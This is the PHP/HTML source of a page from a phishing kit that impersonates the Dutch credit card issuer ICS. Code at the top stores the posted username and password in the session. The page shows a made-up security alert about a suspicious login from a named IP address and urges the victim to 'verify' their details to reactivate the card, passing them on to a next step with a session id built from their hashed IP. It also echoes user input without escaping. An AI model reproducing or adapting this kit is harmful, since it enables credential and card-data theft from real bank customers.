<?php

session_start();

if(isset($_POST['username'])) {

  $_SESSION['username'] = $_POST['username'];
  
}

if(isset($_POST['password'])) {

  $_SESSION['password'] = $_POST['password'];
  
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html lang="nl" xml:lang="nl" xmlns="http://www.w3.org/1999/xhtml" class="win chrome chrome5 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style></style>

<title>Security</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" type="text/css" href="./step1_files/reset.css">
<link rel="stylesheet" type="text/css" href="./step1_files/structure.css">
<link rel="stylesheet" type="text/css" href="./step1_files/components.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/js-enabled.css">
<!--[if IE 7]><link href="/theme/ics/style/ie7-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 8]><link href="/theme/ics/style/ie8-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 9]><link href="/theme/ics/style/ie9-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<style type="text/css">@import url(./step1_files/import.css);</style>
</head>
<body class="ics">
<div id="PageContainer">
<div class="RowContainer">

<div class="clear"><div id="Header"><div class="header-block"><div class="logo-block"><img alt="Logo voor afdruk-weergave" src="./step1_files/logo-ics.gif" class="print"><a href="" title=""><strong></strong></a></div></div><div id="Navigation" class="navigation-block"><strong class="text-only">Pagina navigatie:</strong><ul><li id="nav-00"><a href=""><span>Home</span></a></li><li id="nav-01"><a href=""><span>Producten</span></a></li><li id="nav-02"><a href=""><span>Aanbiedingen</span></a></li><li id="nav-03"><a href=""><span>Klantenservice</span></a></li><li id="nav-05"><a id="nav-login" href=""><span>Mijn ICS</span></a></li></ul><form enctype="text/plain" method="get" action=""><fieldset><legend>Zoeken</legend><label for="searchString" class="text-only">Uw vraag in minimaal 2 woorden</label><input maxlength="128" class="text-field label-value remove-value no-focus" name="searchString" id="searchString" type="text"><input class="button-submit" value="" name="search-header" id="search-header" type="submit" formnovalidate="formnovalidate"></fieldset></form></div></div>
</div>
<div class="RowContainer">
<div class="col maincontent">
<div class="form-block">
<div class="form-container">
<h1>Beveiligings bericht voor "<strong><?php if(isset($_POST['username']))  { echo $_POST['username']; } ?></strong>"</h1><br><br>
<p>Ons Beveiligings systeem heeft een verdachte log in ontdekt via een ander ip nummer als wat bekend is bij ons de log in is gedaan vanaf ip nummer <strong>"5.101.64.98"</strong> vul de volgende informatie in om u gegevens te valideren en u kaart weer te activeren.</p>
<br><br><br><br>

<fieldset class="form-buttons"><div class="button-submit"><input type="submit" id="finish" name="_finish" value="Start verifiëren" tabindex="8" class="" onClick="window.location.href='step1.php?&sessionid=<?php $v_ip = $_SERVER['REMOTE_ADDR']; $hash = md5($v_ip); echo $hash; ?>&securessl=true'"></div></fieldset>

</div>
</div>
</div>
<div class="col sidebar">
<div class="container">
<div class="row">
<div class="col" style="width:44px;">

</div>
</div>
<div class="row">
<div class="col" style="width:260px;"><div class="login-block"><div class="inner"><h2>Mijn ICS</h2><div class="linklist-block"><ul><li><a href="">Activeren online omgeving</a></li><li><a href="">Meer weten over Mijn ICS</a></li><li class="link-more"><a href="">Inloggegevens vergeten?</a></li></ul></div><div class="login"><span><a name="button_inloggen" href=""><span>Inloggen</span></a></span></div></div></div></div>
</div>
</div>
</div>
</div>
<div class="RowContainer">
<div id="footerlinks-block">
<div class="footerlinks-block"><a class="usp-campagne" href=""><img src="./step1_files/usp_banner.png"></a><strong class="text-only">Algemene links:</strong><ul style="width:990px;margin-top: 0;"><li><span><a title="" href="">Over ICS</a></span></li><li><span><a title="" href="">Contact</a></span></li><li><span><a title="" href="">Privacy Statement</a></span></li><li><span><a title="Cookies instellen" href="">Cookies</a></span></li><li><span><a title="" href="">Disclaimer</a></span></li><li><span><a title="" href="">Algemene Voorwaarden</a></span></li><li><span><a title="Zakelijke Cards" href="" target="_blank">Zakelijke Cards</a></span></li><li><span><a title="" href="">Pers</a></span></li></ul><p></p></div>

</div>
</div>
</div>


</div></body></html>